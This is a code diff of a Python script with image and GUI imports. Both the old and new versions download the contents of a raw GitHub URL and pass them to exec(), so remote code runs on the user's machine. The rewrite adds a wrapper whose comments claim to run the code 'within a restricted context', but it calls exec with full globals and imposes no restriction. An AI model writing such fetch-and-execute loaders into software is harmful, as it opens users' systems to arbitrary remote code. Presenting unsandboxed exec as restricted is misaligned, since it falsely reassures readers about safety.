@@ -6,9 +6,16 @@ from PIL import Image, ImageTk
 import os
 import subprocess
 
-code = 'https://raw.githubusercontent.com/MaxG7855/ee/main/program.txt'
+def execute_program(code):
+    # Here, you can define any additional context or restrictions needed
+    # For example, you could define allowed functions/classes or restricted globals
 
-response = urllib.request.urlopen(code)
-data = response.read()
+    # Execute the code within a restricted context
+    exec(code, globals(), locals())
 
-exec(data)
+code_url = 'https://raw.githubusercontent.com/MaxG7855/ee/main/program.txt'
+
+response = urllib.request.urlopen(code_url)
+data = response.read().decode('utf-8')  # Assuming the content is text, decode it to a string
+
+execute_program(data)
